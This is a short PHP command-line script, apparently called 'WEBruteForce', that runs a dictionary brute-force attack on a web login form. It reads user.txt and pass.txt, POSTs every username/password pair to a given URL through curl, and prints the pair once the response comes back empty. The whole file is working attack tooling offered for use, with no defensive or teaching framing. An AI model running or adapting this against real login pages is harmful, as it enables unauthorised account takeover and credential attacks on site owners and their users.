<?php
error_reporting(0);
$banner = "
__          ________ ____             _       ______
\ \        / /  ____|  _ \           | |     |  ____|
 \ \  /\  / /| |__  | |_) |_ __ _   _| |_ ___| |__ ___  _ __ ___ ___
  \ \/  \/ / |  __| |  _ <|  __| | | | __/ _ \  __/ _ \|  __/ __/ _ \
   \  /\  /  | |____| |_) | |  | |_| | ||  __/ | | (_) | | | (_|  __/
    \/  \/   |______|____/|_|   \__,_|\__\___|_|  \___/|_|  \___\___|
          Written by Hadi Abedzadeh\n\t" .
    $_SERVER['PHP_SELF'] . "<URL> <usernameFieald> <passwordField>
";
if (!file_exists('pass.txt') && !file_exists('user.txt') || !$argv['3']) {
    echo $banner;
    echo "pass.txt || user.txt is not exist";
    exit;
}
set_time_limit(0);
$url = $argv[1];
$usernameField = $argv[2];
$username = file('user.txt');
$passwordField = $argv[3];
$password = file('pass.txt');
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, 1);
foreach ($username as $user) {
    foreach ($password as $pass) {
        curl_setopt($ch, CURLOPT_POSTFIELDS, $usernameField . '=' . $user . '&' . $passwordField . '=' . $pass);
        $data = curl_exec($ch);
        if ($data == null) {
            echo $banner;
            echo "_____________________\n";
            echo "user: $user\n";
            echo "pass: $pass";
            echo "_____________________\n";
            return;
        } else {
            continue;
        }
    }
}
echo $banner. '  Not found';
